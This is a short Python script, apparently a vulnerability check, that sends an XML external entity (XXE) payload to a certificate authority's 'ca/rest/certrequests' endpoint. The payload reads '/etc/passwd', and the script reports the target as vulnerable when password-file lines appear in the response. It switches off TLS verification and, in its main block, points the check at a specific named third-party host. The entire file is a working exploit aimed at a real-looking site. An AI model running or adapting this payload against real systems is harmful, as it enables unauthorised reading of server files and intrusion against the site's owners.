import requests, re, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    target_url = url + "ca/rest/certrequests"
    body = '''<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]>
<CertEnrollmentRequest>
    <Attributes/>
    <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>'''
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(target_url, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 400 and re.search("root:.*?:[0-9]*:[0-9]*:", response.text):
        return target_url
    else:
        return False


if __name__ == '__main__':
    print(doCheck("http://edoc.aeonlife.com.cn/"))
